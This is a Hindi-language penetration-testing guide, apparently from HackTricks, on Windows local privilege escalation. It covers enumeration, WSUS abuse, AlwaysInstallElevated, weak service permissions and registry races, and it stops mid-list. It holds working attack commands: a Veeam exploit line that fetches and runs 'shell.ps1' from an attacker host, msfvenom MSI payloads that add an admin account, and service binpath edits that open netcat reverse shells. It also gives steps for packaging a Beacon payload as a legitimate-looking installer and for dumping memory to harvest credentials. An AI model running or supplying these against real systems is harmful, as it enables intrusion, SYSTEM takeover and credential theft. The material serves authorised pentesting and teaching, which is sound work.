# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्नलिखित पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में कई ऐसी चीज़ें हैं जो आपको सिस्टम को enumerating करने से रोक सकती हैं, executables चलाने से रोक सकती हैं या आपकी गतिविधियों को detect भी कर सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्नलिखित पृष्ठ पढ़कर इन सभी defense mechanisms को enumerate करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

RAiLaunchAdminProcess के माध्यम से लॉन्च किए गए UIAccess processes का दुरुपयोग AppInfo secure-path checks bypass होने पर prompts के बिना High IL तक पहुँचने के लिए किया जा सकता है। विशेष UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

यह जांचें कि Windows संस्करण में कोई ज्ञात vulnerability तो नहीं है (लागू किए गए patches भी जांचें).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो दर्शाते हैं कि एक Windows environment कितना बड़ा **attack surface** प्रस्तुत करता है।

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

इसे कैसे चालू करना है, आप इस लिंक पर सीख सकते हैं: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन के निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड कॉल और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम कैद नहीं किए जा सकते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 इवेंट देखने के लिए आप निम्न कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की सम्पूर्ण गतिविधि और सामग्री का पूरा रिकॉर्ड कैप्चर किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का हर ब्लॉक उसके चलने के समय दस्तावेज़ित हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल सुरक्षित रखती है, जो फॉरेंसिक विश्लेषण और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेजीकरण करके प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में इस पाथ पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** की बजाय http के माध्यम से अनुरोध किए जा रहे हों तो आप सिस्टम को compromise कर सकते हैं।

आप यह जांच कर शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं — इसके लिए cmd में निम्नलिखित चलाएँ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

तो, **it is exploitable.** अगर अंतिम registry का मान `0` है, तो WSUS entry को ignore कर दिया जाएगा।

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
सारांश में, यह वही flaw है जिसका यह bug exploit करता है:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

आप इस vulnerability को tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके exploit कर सकते हैं (जब यह उपलब्ध हो)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. यदि enrollment को attacker server की तरफ मजबूर किया जा सके और updater किसी rogue root CA या कमजोर signer चेक्स पर भरोसा करता हो, तो एक local user एक malicious MSI deliver कर सकता है जिसे SYSTEM service इंस्टॉल कर देता है। एक generalized technique देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: confirm the listener and version, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: place a PoC such as `VeeamHax.exe` with the required Veeam DLLs in the same directory, then trigger a SYSTEM payload over the local socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** environments में कुछ विशिष्ट परिस्थितियों के अंतर्गत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे environment शामिल हैं जहाँ **LDAP signing is not enforced,** users के पास self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** को configure करने की अनुमति देते हैं, और users के पास domain के भीतर computers बनाने की क्षमता होती है। ध्यान देने योग्य है कि ये **requirements** **default settings** का उपयोग करते समय मिल जाती हैं।

पाएं **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

हमले के प्रवाह के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

यदि ये 2 registers **enabled** (value is **0x1**) हैं, तो किसी भी privilege वाले users `*.msi` फाइलें NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

PowerUP के `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान निर्देशिका में एक Windows MSI बाइनरी बनाई जा सके जो privileges escalate करे। यह स्क्रिप्ट एक precompiled MSI installer लिखती है जो user/group addition के लिए prompt करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
सिर्फ़ बनाए गए binary को execute करें ताकि privileges escalate हों।

### MSI Wrapper

इस tutorial को पढ़ें ताकि आप सीख सकें कि इन tools का उपयोग करके MSI wrapper कैसे बनाते हैं। ध्यान दें कि आप "**.bat**" फ़ाइल को wrap कर सकते हैं अगर आप सिर्फ़ **command lines** को **execute** करना चाहते हैं।


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** या **Metasploit** से `C:\privesc\beacon.exe` में एक नया **Windows EXE TCP payload** जनरेट करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और सर्च बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट का नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** चुनें, **place solution and project in the same directory** को चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) तक नहीं पहुँचते। **Add** पर क्लिक करें और अभी जनरेट किया हुआ Beacon payload चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो इंस्टॉल्ड ऐप को अधिक वैध दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। यह सुनिश्चित करेगा कि इंस्टॉलर चलने के साथ ही beacon payload execute हो।
- **Custom Action Properties** के तहत **Run64Bit** को **True** में बदलें।
- अंत में, **build** करें।
- यदि यह warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया हुआ है।

### MSI Installation

दुर्भावनापूर्ण `.msi` फ़ाइल की **installation** को **background** में चलाने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जा रहे हैं।
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** स्थानीय प्रशासक पासवर्ड के प्रबंधन के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि डोमेन से जुड़े कंप्यूटरों पर प्रत्येक पासवर्ड अद्वितीय, यादृच्छिक और नियमित रूप से अपडेट होता है। ये पासवर्ड सुरक्षित रूप से Active Directory में संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों, जिससे अधिकृत होने पर वे स्थानीय प्रशासक पासवर्ड देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **सादा-पाठ पासवर्ड LSASS में संग्रहीत होते हैं** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए सुदृढ़ सुरक्षा पेश की ताकि अनविश्वसनीय प्रक्रियाओं द्वारा इसकी मेमोरी को **read its memory** करने या **inject code** के प्रयासों को **block** करके सिस्टम को और सुरक्षित बनाया जा सके.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था. यह डिवाइस पर संग्रहित credentials को pass-the-hash जैसे खतरों से सुरक्षित रखने के लिए है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**डोमेन क्रेडेंशियल्स** को **स्थानीय सुरक्षा प्राधिकरण** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम घटकों द्वारा उपयोग किए जाते हैं। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी पंजीकृत सुरक्षा पैकेज द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए **डोमेन क्रेडेंशियल्स** स्थापित हो जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि क्या जिन समूहों का आप हिस्सा हैं उनमें किसी के पास रोचक अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूह और उन्हें दुरुपयोग करके विशेषाधिकार कैसे बढ़ाएँ, यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token हेरफेर

**और जानें** कि इस पृष्ठ पर **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **interesting tokens के बारे में जानें** और उन्हें दुरुपयोग कैसे करें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन किए गए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## Running Processes

### File and Folder Permissions

सबसे पहले, processes को सूचीबद्ध करते समय **process के command line में passwords की जाँच करें**.\
जाँच करें कि क्या आप **किसी running binary को overwrite कर सकते हैं** या क्या आपके पास उस binary folder की write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का exploit किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा जांचें कि संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) तो नहीं चल रहे हैं।

**प्रोसेसों की बाइनरी फ़ाइलों की अनुमतियाँ जाँचना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों के permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप चल रही प्रक्रिया का memory dump **procdump** (sysinternals) का उपयोग करके बना सकते हैं। FTP जैसी services में **credentials in clear text in memory** होते हैं; memory dump करके credentials पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले Applications एक उपयोगकर्ता को CMD स्पॉन करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1) में "command prompt" खोजें, फिर "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

Service Triggers Windows को एक service स्टार्ट करने देते हैं जब कुछ विशेष परिस्थितियाँ होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers फायर करके स्टार्ट कर सकते हैं। enumeration और activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
यह अनुशंसित है कि बाइनरी **accesschk** को _Sysinternals_ से प्राप्त किया जाए ताकि प्रत्येक सेवा के लिए आवश्यक privilege level की जाँच की जा सके।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह जांचने की सिफारिश की जाती है कि क्या "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे सक्षम करने के लिए निम्नलिखित का उपयोग कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost के काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**एक और उपाय** इस समस्या का यह है कि इसे चलाया जाए:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी सेवा पर **SERVICE_ALL_ACCESS** अधिकार होते हैं, सेवा के executable binary में संशोधन संभव है। **sc** को संशोधित करने और चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary को पुनः कॉन्फ़िगर करने की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership हासिल करने और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता देता है।
- **GENERIC_ALL**: भी service configurations बदलने की क्षमता देता है।

इस vulnerability का पता लगाने और exploit करने के लिए, _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries के कमजोर permissions

**जाँचें कि क्या आप उस binary को modify कर सकते हैं जो किसी service द्वारा execute किया जाता है** या क्या आपके पास **write permissions on the folder** हैं जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप उन सभी binary को जो किसी service द्वारा execute किए जाते हैं, **wmic** का उपयोग करके प्राप्त कर सकते हैं (not in system32) और अपनी permissions को **icacls** का उपयोग करके चेक कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Services registry modify permissions

आपको यह जाँचना चाहिए कि क्या आप किसी भी service registry को modify कर सकते हैं.\
आप निम्नलिखित करके किसी service **registry** पर अपनी **permissions** **check** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांच करनी चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो service द्वारा execute किए जाने वाले binary को बदला जा सकता है।

execute किए जाने वाले binary का Path बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility फीचर per-user **ATConfig** keys बनाते हैं जिन्हें बाद में एक **SYSTEM** process द्वारा HKLM session key में कॉपी किया जाता है। एक रजिस्ट्री **symbolic link race** उस प्रिविलेज्ड write को **किसी भी HKLM path** पर रीडायरेक्ट कर सकता है, जिससे arbitrary HKLM **value write** primitive मिल जाता है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` इंस्टॉल किए गए accessibility features को सूचीबद्ध करता है।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` यूज़र-नियंत्रित कॉन्फ़िगरेशन स्टोर करता है।
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` logon/secure-desktop transitions के दौरान बनाया जाता है और user द्वारा writable होता है।

Abuse flow (CVE-2026-24291 / ATConfig):

1. उस **HKCU ATConfig** वैल्यू को भरें जिसे आप चाहते हैं कि SYSTEM लिखे।
